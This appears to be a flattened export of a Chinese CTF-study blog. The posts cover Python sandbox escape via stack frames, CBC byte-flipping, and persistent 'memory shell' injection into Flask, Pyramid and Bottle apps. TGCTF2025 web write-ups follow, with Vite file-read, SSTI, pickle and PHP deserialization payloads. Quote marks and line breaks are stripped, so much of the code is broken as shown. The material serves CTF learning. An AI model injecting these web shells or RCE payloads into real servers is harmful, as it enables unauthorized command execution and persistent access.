内部) – frame1 (waff 函数) – frame2 (exec 所在作用域) 下面脚本就是通过栈帧一步一步拿到全局变量s3cret但是不直接引用 s3cret=this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals[s3cret] #返回并获取前一级栈帧的globals return bb=waff()locals=code = compile(codes, test, exec)exec(code,locals)print(locals[b]) 过滤绕过list send 生成器表达式绕过 yield过滤也可以用生成器表达式进行绕过 globals中的__builtins__字段代码这么设计 key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_back.f_back.f_globals[key] #返回并获取前一级栈帧的globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) 这里将沙箱中的__builtins__置为空，也就是说沙箱中不能调用内置方法了，那我们这段代码运行就会报错了(next方法不能使用)，那么该如何代替next方法来拿到生成器的值，还记得上面说可以遍历的形式来获取生成器的值： key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = [i for i in g][0] #获取到生成器的栈帧对象 b = frame.f_back.f_back.f_back.f_globals[key] #返回并获取前一级栈帧的globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) ​","tags":["CTF学习"]},{"title":"CBC字节翻转攻击","path":"/2025/04/27/CBC字节翻转攻击/","content":"CBC加密和解密过程 加密过程CBC加密流程： 准备 将明文按固定长度（通常是块大小，比如AES是128位）分块。 如果最后一块不足长度，需要填充（padding）。 选一个初始化向量（IV），它的长度跟分块大小相同。 加密每一块（第 i 块） 第1步：用当前明文块 PiP_iPi 和前一块密文（或IV）做异或（XOR）。 第一个块是$$C_0Ek(P0⊕IV)$$ 第2步：将异或后的结果送入加密算法（E_k）（比如AES）加密，得到当前块的密文 Ci。 第3步：当前的密文块 CiC_iCi 会作为下一块明文的XOR对象。 循环处理每一块，直到全部加密完成。 解密过程解密过程刚好相反，第一组密文在解密之后与初始向量IV异或得到第一组明文。第二组密文解密之后和第一组密文异或得到第二组明文。也就是说，解密一组明文需要本组和前一组的密文。 特点加密算法的输入是上一个密文分组和下一个明文分组的异或 EXB模式和CBC模式 CBC字节翻转攻击CBC字节翻转攻击的核心原理是通过破坏一个比特的密文来篡改一个比特的明文。 $$由题目得 A⊕BC$$如果我们想要改变输出的明文C 那我们只需要改变秘钥A 令改变后的A为A’ C为C’，于是： C=C⊕C⊕C =A⊕B⊕C⊕C =B⊕A⊕C⊕C令A=A⊕C⊕C--C=B⊕A--A⊕B=C 翻转成功啦！ 所以把A改为A’A⊕C⊕C’ 我们就可以实现这个字节翻转攻击 测试攻击模拟代码from Crypto.Cipher import AESimport uuidimport binasciiBS = AES.block_size # 分组长度key = btest # 密钥iv = uuid.uuid4().bytes # 随机初始向量pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() # Pkcs5Paddingdata = b1234567890abcdefabcdef1234567890 # 明文M# 加密def enc(data): aes = AES.new(pad(key), AES.MODE_CBC, iv) ciphertext = aes.encrypt(pad(data)) ciphertext = binascii.b2a_hex(ciphertext) return ciphertext# 解密def dec(c): c = binascii.a2b_hex(c) aes = AES.new(pad(key), AES.MODE_CBC, iv) data = aes.decrypt(c) return data# 测试CBC翻转def CBC_test(c): c = bytearray(binascii.a2b_hex(c)) c[0] = c[0] ^ ord(a) ^ ord(A) # c[0]为第一组的密文字符，a为第二组相应位置的明文字符，A是我们想要的明文字符 这一步就是在做 A=A⊕C⊕C c = binascii.b2a_hex(c) return cprint(ciphertext:, enc(data))print(data:, dec(enc(data)))print(CBC Attack:, dec(CBC_test(enc(data)))) 输出结果 ciphertext: b65518dfe77f7d677134f341c5b00c1674e7a87b231f852b63d35ee69dc60bcc7c5b7325b590c00d089b6ad312f21b043data: b1234567890abcdefabcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10CBC Attack: b\\xfe\\xb4\\x11n+\\x1a\\xb7\\x90\\x9c\\x86TPvS\\xd4\\x9cAbcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10 可以看到第二组密文解密之后已经被我们更改成了A，而由于我们更改了第一组的密文，所以第一组解密的明文变成了乱码。如果我们想要更改第一组的明文，则需要修改初始向量IV的值。 于是达到修改明文的内容的目的：解密出来的内容就会把 a 改成 A 例题bugku-login4题解链接：https://cltheorem.github.io/2019/03/bugku-login/ 总结通过CBC字节翻转攻击，假如我们能够触发加解密过程，并且能够获得每次加密后的密文。那么我们就能够在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，而且只能从最后一组开始修改，并且每改完一组，都需要重新获取一次解密后的数据，要根据解密后的数据来修改前一组密文的值。 参考文章https://blog.csdn.net/XL115715453/article/details/102442024?spm=1001.2014.3001.5506 https://goodapple.top/archives/217 https://blog.csdn.net/XiongSiqi_blog/article/details/131925246","tags":["CTF学习"]},{"title":"浅谈python内存马","path":"/2025/04/20/python内存马学习/","content":"前言：想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西 Python内存马众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式 Flask内存马注入flask框架中使用 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。 老版flask内存马注入多存在ssti的场景中 如果想要在python中实现内存马 必须想是否能动态注册新路由 flask注册新路由用的是 app.route 实际调用的是add_url_ruel 注意：从下面一直到构造webshell 都是前言知识 为了让你更好理解 内存马的payloadadd_url_ruel介绍app.add_url_rule(/index/,endpoint=index,view_func=index) 三个参数： url:必须以开头 endpoint：(站点) view_func：方法 只需要写方法名也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了view_func参数了，程序就会直接报错。 原理首先是要添加路由成功，然后特别重要的是 view_func中采用匿名函数的方式。该函数要实现捕获值，命令执行，响应。 当一个网页请求后，会实例化一个Request Context。在python中分出了两种上下文，请求上下文(request context)和应用上下文(session context)。一个请求上下文中封装了请求的信息。而上下文的结构是运用了一个Stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。request context实例化后，它会被push到栈_request_ctx_stack中，那我们可以通过获取栈顶元素的方法来获取当前的请求。 Request=_request_ctx_stac.top lambada表达式链接:https://www.runoob.com/python3/python-lambda.html Flask上下文管理机制在使用 Flask 框架实现功能接口的时候，前端点击按钮发送请求的请求方式和 form 表单提交给后端的数据，后端都是通过 Flask 中的 request 对象来获取的。在 Flask 框架中，这种传递数据的方式被称为上下文管理，在 Flask 框架中有四个上下文管理对象：request ,session,current_app 和 g 变量。其中request 和 session 被称为请求上下文,current_app 和 g 变量被称为应用上下文。 其实一句话理解就是：Flask 的上下文机制是为了解决“请求中相关的数据需要在多个函数中使用，但又不想手动层层传参”的问题。 请求上下文 (request context)Flask上下文对象相当于一个容器。保存了Flask程序运行过程的一些信息，比如请求方式和表单数据。 1.request 在 Flask 中，request 对象封装了 HTTP 请求的内容，针对的是 HTTP 请求，保存了当前请求的相关数据。 2.session session和cookie都是用来做状态保持 但是cookie依赖于浏览器，但是session不需要。 应用上下文 (application context)应用上下文不是一直存在的，他是临时的，发送请求才会有应用上下文，请求结束后就会失效。 1.curent_app current_app 是应用程序上下文，用于存储 Flask 应用程序 app 中的变量，可以在 current_app 中存储一些变量。 2.g变量 g 是 AppContext 中的临时全局变量，每个请求独立，适合用于存储数据库连接、缓存等中间件资源。会随着请求的结束而销毁。 核心两个栈 类型 名称 存什么 请求上下文栈 _request_ctx_stack 包含 request, session, g 等 应用上下文栈 _app_ctx_stack 包含 current_app, g eval用法eval(expression, globalsNone, localsNone)expression(必需):python表达式 执行并访问执行的结果 globals(可选):这是一个字典，它提供了执行表达式时可用的全局变量。如果没有提供，eval() 默认使用调用时的全局作用域（即当前环境中的全局变量） locals(可选):这是一个字典，表示执行表达式时可用的局部变量。如果没有提供，eval() 默认使用当前作用域中的局部变量。 内存马写法url_for.__globals__[__builtins__][eval](\tapp.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read()\t), _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] (1)url_for.__globals__[__builtins__] Python 中内置的全局函数和对象，包括 print()、eval() 等。通过这一步，你可以访问内置的 eval() 函数 (2)( app.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read() ) 创建一个新路由 shell 在这个shell 获取请求中的cmd参数 如果没有提供cmd参数 就默认执行whoami命令 (3) _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] 这是eval的函数第二个参数 其实就是字典 允许在执行表达式时使用 Flask 特有的变量和对象 Flask 的上下文管理使用了栈结构，通过将 _request_ctx_stack 和 app 放到上下文字典中，eval() 就可以访问到当前的请求上下文和应用对象，进而执行动态生成的代码。这使得攻击者可以利用这种机制执行恶意的操作（比如执行传入的命令）。 新版flask内存马注入新版已经不支持通过add_url_rule添加路由了，所以要考虑用其他的方法来代替add_url_rule 使用@app.before_request和 @app.before_request在response(响应)之前做响应 from flask import Flaskfrom flask import requestfrom flask import redirectfrom flask import session app = Flask(__name__) # type:Flaskapp.secret_key = DragonFire @app.before_requestdef is_login(): if request.path == /login: return None if not session.get(user): return redirect(/login) @app.route(/login)def login(): return Login @app.route(/index)def index(): return Index @app.route(/home)def home(): return Login app.run(0.0.0.0, 5000) 查看这个定义 发现 self.before_request_funcs.setdefault(None, []).append(f) 意思：将函数 f 注册为全局的 before_request 钩子，在每次请求处理前自动调用。 [钩子函数是一种“插入点”，让你在程序的某些关键时刻执行自定义逻辑] 意思就是我们可以传入一个lambada函数来执行命令！lambda :__import__(os).popen(whoami).read() 构造poc:eval(__import__(sys).modules[__main__].__dict__[app].before_request_funcs.setdefault(None,[]).append(lambda :__import__(os).popen(dir).read())) ！！！！这样在每次response之前都会执行lambada函数来执行命令~~~ 尝试本地起服务 from flask import Flask, request, Responseapp = Flask(__name__)@app.route(/)def index(): return Home Page@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: # 使用 eval 动态注入代码 eval(cmd) return Payload injected successfully except Exception as e: return fError: e@app.before_requestdef trigger_hook(): pass # 所有注入的 before_request 都会自动执行if __name__ == __main__: app.run(debug=True) 随意访问一个目录 得到 执行命令成功啦！喜！ @app.after_request在response(响应)之后做出响应 @app.after_requestdef foot_log(environ): if request.path != /login: print(有客人访问了,request.path) return environ 这里也是和前面的差不多 但是要定义一个返回值 不然会报错 eval(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(cmd) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\cmd\\)).read())\\)==None else resp)) from flask import Flask, request, make_responseapp = Flask(__name__)# 注入点：可动态注入 payload@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: eval(cmd) return Payload injected successfully except Exception as e: return fError: e# 初始钩子：占位@app.after_requestdef default_after(resp): return resp# 主页面@app.route(/)def index(): return Home Pageif __name__ == __main__: app.run(debug=True) bingo!成功 pickle下利用的poc import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(\\sys\\).modules[__main__].__dict__[app].before_request_funcs.setdefault(None, []).append(lambda :__import__(os).popen(request.args.get(gxngxngxn)).read()),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(sys).modules[__main__].__dict__[app].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(gxngxngxn) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\gxngxngxn\\)).read())\\)==None else resp),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (exec,(global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(os).popen(request.args.get(gxngxngxn)).read(),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) 参考文章https://xz.aliyun.com/news/13858https://www.cnblogs.com/gxngxngxn/p/18181936https://research.qianxin.com/archives/2329https://blog.csdn.net/solitudi/article/details/115331388 Pyamid内存马例题详见 TGCTF20245 熟悉的配方* 或者 强网杯决赛Pyramid 利用栈帧打Pyramid WEB框架下的内存马栈帧不懂得详情看:https://blog.csdn.net/Jesse_Kyrie/article/details/139789665 栈帧（Stack Frame）是 Python 虚拟机 中程序执行的载体之一，也是 Python 中的一种执行上下文。 每当 Python 执行一个函数或方法时，都会创建一个栈帧来表示当前的函数调用，并将其压入一个称为 调用栈 （Call Stack）的数据结构中。 调用栈是一个后进先出（LIFO）的数据结构，用于管理程序中的函数调用关系。 栈帧的创建和销毁是动态的，随着函数的调用和返回而不断发生 构造内存马Pyramid WEB新框架下的内存马发现是通过pyramid.config来生成的，因为pyramid.config里有add_view add_route，可以用来注册路由。 所以我们要那到这个config，所以得获取到栈帧的globals全局才能拿到当前的app config。 先看下面这段代码，这个就是为了获取config那个栈帧 def f(): yield g.gi_frame.f_backg = f() frame = next(g) b = frame.f_back.f_back.f_globalsprint(b) 然后拿到这个栈帧过后 就访问config添加新路由了 下面定义了一个新hello函数 def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) #添加新路由 config.add_view(hello, route_name=shell) #给/shell路由绑定视图hello config.commit() #立即更新服务 而不是手动重启 这样才能够生效 整合一下payload就是 def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) config.add_view(hello, route_name=shellb) config.commit() waff() TGCTF2025 熟悉* payload写法 import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.params[code] res=eval(code) return Response(res) config.add_route(shellb, /shellb) config.add_view(hello, route_name=shellb) config.commit() waff()url=YOUR_URLdata=expr:fcode+111res=requests.post(url=url,data=data)print(res.text) 强网杯pyramid脚本 import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals print(b)waff()code1=print(1)burp0_url = http://127.0.0.1:6543/api/test?code=+code+token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tburp0_headers = User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8, Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2, Accept-Encoding: gzip, deflate, br, Connection: close, Upgrade-Insecure-Requests: 1, Sec-Fetch-Dest: document, Sec-Fetch-Mode: navigate, Sec-Fetch-Site: none, Sec-Fetch-User: ?1, Priority: u=0, ires=requests.get(burp0_url, headers=burp0_headers)print(res.text) bottle内存马参考文章:https://forum.butian.net/share/4048 这里直接记录几种做法 1.直接绑定路由payload app.route(/b,GET,lambda :__import__(os).popen(request.params.get(a)).read()) #直接访问/b路由 a参数可以进行rce 2.利用报错界面 污染报错界面payload app.error(404)(lambda e: __import__(os).popen(request.query.get(a)).read()) 3.利用add_hookadd_hook就是注册钩子函数 #reaponseapp.add_hook(before_request, lambda: __import__(bottle).response.set_header(X-flag, __import__(base64).b64encode(__import__(os).popen(request.query.get(a)).read().encode(utf-8)).decode(utf-8)))#abortapp.add_hook(before_request, lambda: __import__(bottle).abort(404,__import__(os).popen(request.query.get(a)).read())) 结语学习python内存马先告一段落了 有很多其他模板的内存马 以后遇到了再来补全吧~~~","tags":["CTF学习"]},{"title":"TGCTF2025-WEB WP","path":"/2025/04/14/TGCTF2025-WEB/","content":"AAA偷渡阴平?php ?------WebKitFormBoundaryU4VFMZ4wbU2hEGvgContent-Disposition: form-data; name=submit上传文件------WebKitFormBoundaryU4VFMZ4wbU2hEGvg-- 前端GAME进去是个小游戏 本来以为是正常思路 但是怎么都做不出 于是题目是个vue框架的游戏 于是搜索 发现有关于这个的漏洞 漏洞文章:Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区 Vite存在CVE-2025-30208安全漏洞（附修复方案和演示示例) Vite漏洞原理Vite在开发服务器模式下，提供了@fs功能，原本是为了让开发者访问服务允许范围内的文件。正常情况下，如果请求的文件超出了这个允许范围，Vite应该返回“403 Restricted”，提示访问受限。但攻击者发现了一个“漏洞”，当在请求URL中添加?raw??或?importraw??这样的特殊参数时，就能绕过原本的文件访问限制检查。 原因：Vite在处理请求的多个环节中，会移除类似?的结尾分隔符，但在查询字符串的正则匹配过程中，却没有考虑到这种特殊情况，这就给攻击者可乘之机，他们利用这个缺陷，就能读取目标文件的内容。 题目解法直接按照他给的payload /@fs/tgflagggg?importraw?? 前端GAME Plus上一道题的payload不可行了 文章未公开的poc:可以通过svg来进行文件读取 /@fs/tgflagggg?import?meteorkai.svg?.wasm?init 得到VEdDVEZ7ZmUxM2MzZGYtYzNkNC1hYjJhLTQwZjYtNjNjYjM1MzczNjAyfQo base64解码 TGCTF{fe13c3df-c3d4-ab2a-40f6-63cb35373602} 前端GAME Ultraplus的payload也不可以 /@fs/app#/../proc/self/environ读环境变量 也可以 /@fs/app/vite-project/#/../../../../../tgflagggg 直面天命访问hint 提示是一个四个小写英文字母的路由 爆出来是aazz路由 进去f12 看到说是可以传参数 but不知道参数是什么 那就arjun爆破吧 爆出来是filename 看到fillename参数 一般会考虑到ssrf 就像name是ssti一样 传入?filename=/etc/passwd 可以读取 尝试读取环境变量 ?filename=/proc/1/environ 也可以直接读flag 直面天命（复仇）import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self]def waf(name): for x in black_list: if x in name.lower(): return True return Falsedef is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars@app.route(/)def home(): return send_from_directory(static, index.html)@app.route(/jingu, methods=[POST])def greet(): template1= template2= name = request.form.get(name) template = fname if waf(name): template = 想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹Image else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = 连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧再去西行历练历练Image return render_template_string(template) template1 = “六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“”最后，如果你用了cat，就可以见到齐天大圣了 template= template.replace(天命,).replace(难违,) template = template if cat in template: template2 = 或许你这只叫天命人的猴子，真的能做到？Image try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f500报错了，查询语句如下：template return error_message, 400@app.route(/hint, methods=[GET])def hinter(): template=hint：有一个aazz路由，去那里看看吧，天命人! return render_template_string(template)@app.route(/aazz, methods=[GET])def finder(): with open(__file__, r) as f: source_code = f.read() return fsource_code, 200, Content-Type: text/html; charset=utf-8if __name__ == __main__: app.run(host=0.0.0.0, port=80) 审计源码 黑名单 black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self] 把{}ban了 但是天命和难违可以替换为 所以直接按照黑名单 打ssti就可 最后payload 天命((g[pop][\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f][\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f][\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f](os))[popen](cat /t*))[read]()难违 火眼辩魑魅进去dirsearch扫描网站 看到robots.txt 访问得到很多路由 说是只有一个能到 直接到tgshell.php打rce即可 post传入· shell=print \\cat t*`; 因为是一句话木马 也可以直接使用蚁剑连接 然后也可得到flag 什么文件上传？进去是文件上传 发现传什么都被ban 于是dirsearch了一下网站 robots.txt里有东西 [图片] 访问class.php 发现是是反序列化并且有漏洞点 ?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); class yesterday public $learn; public $study=study; public $try; public function __construct() $this-learn = learnbr; public function __destruct() echo You studied hard yesterday.br; return $this-study-hard(); //1 class today public $doing; public $did; public $done; public function __construct() $this-did = What you did makes you outstanding.br; public function __call($arg1, $arg2) $this-done = And what youve done has given you a choice.br; echo $this-done; if(md5(md5($this-doing))==666) return $this-doing(); else return $this-doing-better; //2 class tommoraw public $good; public $bad; public $soso; public function __invoke() $this-good=Youll be good tommoraw!br; echo $this-good; public function __get($arg1) $this-bad=Youll be bad tommoraw!br; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) if ($this-out-useful7) echo Seven is my lucky numberbr; system(whoami); public function __toString() echo This is your future.br; system($_POST[wow]); //3 return win; public function __destruct() $this-no = no; return $this-no; if (file_exists($_GET[filename])) echo Focus on the previous step!br; else $data=substr($_GET[filename],0,-4); unserialize(best64_decode($data)); // You learn yesterday, you choose today, can you get to your future?? 理一下大概的链子顺序 yesterday::destruct（studynew today）- today::__call（doingnew future）- future::__tostring 然后post传入wow就可以进行命令执行 但是有个注意点 function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); ...... unserialize(best64_decode($data)); 序列化后的数据还要base_encode 5次传入 pop链如下 ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();echo serialize($aa);? null替换为%00就行了 因为private属性的原因 Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVMnMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVWM00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlVWMGhDVVZsdE5WTk9iRkY1WTBWYVQxSlViSGRWTWpCNFlURmtSMU5ZYUZwTmFrWllXVEJrUzFkV1JuVlhiWEJPVFVSV00xWXhZM2hPUjBwR1lraEdhMU5JUWxGWlYzUnlaVVpSZVdKRmRGUldNR3cyVjFSS2ExZHJNWEpYYWtaVVZsZG9lbHBITVZOV1JrWjBUbGRHV0ZKclduVlhWbFpyVmpKV1YyTkdWbEJTUjJoaFdXMTBjbU5zVGxoalJFSnNZWHBzZUZWc2FHOVZSMFpXWTBoU1lWSnRhRlJVVm1SUFpFWmFkVmR0ZEZoU2ExcDNWa2h3UWsxRk5IbFVhbHBwVFRKb1QxVnJZelZqUm1SMFRsWmtUbEl4U2xwVk1qRTBZVmRLVldGSVFsVmxhMFYzVkdwS1QwNXRTalpVYkVKb1ZsYzVORmRZY0V0V01rcFlWV3hvYTAweWFFdFpWelZUVlVaU05sUnJOVTloZWxVeVdXcEtjMkV4WkVaT1dFNVlZbFJXV0ZsNlFYaGpSazVWV2taV2FHSnNTVEpXUkVwM1lXczFjbUpJVmxkaWJrSm9WbXBHZG1WR2JISlZhelZvVmxSb00xUnJVbXRoYlZaMFQwaHdWVTF0ZUV4VVZtUk9aVlphZEUxWGRGZE5NazR6VlRGa2QwMUdVWGRQU0hCVlZrWndVRnBYTURWalJuQkhZVVU1YVZKdVFqRldiVFZQVkRGVmQyRjZUbGRTTTBGM1dsZHpOV05XYkRaWGEzQnBZa1p2TWxZeWVHdFpWVEZZVTJ0V1dGWXllRkZVVlZKU1RURnJlbU5JV2s1TlJHeDNWVEp3UjJGck1YTlhibEpoVW0xUmVsUlVRbk5qVjFKR1QxWkNUazFFUVhsV1J6VjNaRzFHV0ZWc2JGVmlXR2hvV1cxNFlXVnNVWGRVYTNCUFRWWktlRnBGYUhkVlIwWjBWRlJLVkZaNlZsaGFWM2gzVjBaa2NWSnRiRk5TTTFKM1ZraHdRazFGTkhsVWFscHBaV3hLVVZsV1ZuWmxSbXcyVTJ4a2FWWXhTbGxhUkU1dlZHeEZkMkY2VGxkU00wRjNXbGR6TldOV2NEWlhhM0JwWWtadk1sWXllR3RaVlRGWVUydFdVMWRIYUV0WlZ6VlRWVVpTTmxSck5VOWhlbXhHV1dwS2MyRXhaRVpPV0U1WVlsUldXRmw2UVhoV1ZrNVlZa1pDVGxKR1JYcFhWRTUzWkdzMVJrOVlRbFJoYTFweFZGZDRZV1JHY0VkYVJFNXNVbFJGTVZVeFVtdFdWMFoxVldwYVZVMXVRblZVYlhSelpGWmFkV05IUmxkTlZ6azBWMWQwVTFKck1VWmlTRVpyVWxSc1VWUlVRWGROYkZGM1ZXNWFhRll4U2xwV1J6RTBXVmRLYzFkdWNGVldiRXBYV1ZaVk5HUXdOVVZhUjNCc1lsUm5kMVpFU25OVE1ERllWRmhzVjJKVVJuSldhazVyVGtaU2RHSkZjRTlOVmtwNFdrVm9kMVZIUm5SWmVrcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldWalpWTVdSM1RVWlJkMDlJY0ZWV1JuQlJWV3RqTldOR2NFZGhSVGxwVW01Q01WWnROVTlVYkZwSVdraENWV1ZyUlhkVWFrcFBUbTFLTmxWc1FtaFdWemswVjFod1MxWXlTbGhWYkdoclRUSm9VVlpVUW5KTk1WcElZMFJDYkdGNmJIaFhibkJoVTIxS2MxZHFXbGhpUjFKb1ZGWmtTMUpXVGxsYVJYQm9ZbXhLVVZaSWNFNWxSMVp5VDFoR1ZWWkdjRXRaYkZwTFpERmtjbFJyY0U5TlZrcDRXa1ZvZDFWSFJuTlNWRXBVVm5wR1ZGcEhNVXRrUmxwWVlrWkNUbEpHUlhwWGJYaHZWR3MxY2sxVVdtbE5iWGh5VlRCV2RrMVdUbGhqUkVKVlRVUm9ObFJWVVhkUVVUMDk=1111 在传入wowcat flag即可 什么文件上传？(复仇)漏洞利用点:phar协议流可被file_exists()函数直接触发 可以上传.avg文件 链子如下 ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public 